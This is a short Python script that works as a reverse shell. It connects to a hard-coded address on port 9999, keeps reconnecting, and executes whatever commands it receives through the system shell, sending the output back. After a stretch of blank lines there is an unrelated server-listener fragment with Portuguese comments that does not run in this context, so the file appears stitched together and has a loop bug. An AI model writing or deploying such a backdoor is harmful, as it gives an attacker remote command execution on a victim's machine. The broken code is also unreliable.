import os
import socket
import subprocess
import time

def socket_create():
    try:
        global host
        global port
        global s
        host = "192.168.0.10"
        port = 9999
        s = socket.socket()
    except socket.error as er:
        print("Socket creation error"+str(er))


#Connect to a remote socket
def socket_connect():
    try:
        global host
        global port
        global s
        s.connect((host,port))
    except socket.error as er:
        print("Socket creation error")
        time.sleep(10)
        socket_connect()

def recieve_commands():
    while True:
        data = s.recv(20480)
        if data[:2].decode() == "cd":
            try:
                os.chdir(data[3:].decode())
            except:
                pass
        if data[:].decode() == "quit":
            s.close()
            break
        if len(data) > 0:
            try:
                cmd = subprocess.Popen(data[:].decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                output_bytes = cmd.stdout.read() + cmd.stderr.read()
                output_str = str(output_bytes.decode("latin-1"))
                s.send(str.encode(output_str + str(os.getcwd() +">")))
                print(output_str)
            except:
                output_str = "Comand not recognized\n"
        s.close()

def main():
    global s
    try:
        socket_create()
        socket_connect()
        recieve_commands()
    except:
        print("Error in main")
        time.sleep(10)
    s.close()
    main()

main()






















#fila antes de conectar
s.listen(5)

while True:
    conn, addr = s.accept() #Aceita a conexao removendo da lista do listen()
    conn.sendall(b"WELCOME")
    print("Conexao de %s:%d"%(addr[0],addr[1]))
    conn.sendall(b">>>:")
    msg = conn.recv(1024)
    print("Mensagem: %s"%msg)
    conn.close()
    break
s.close()
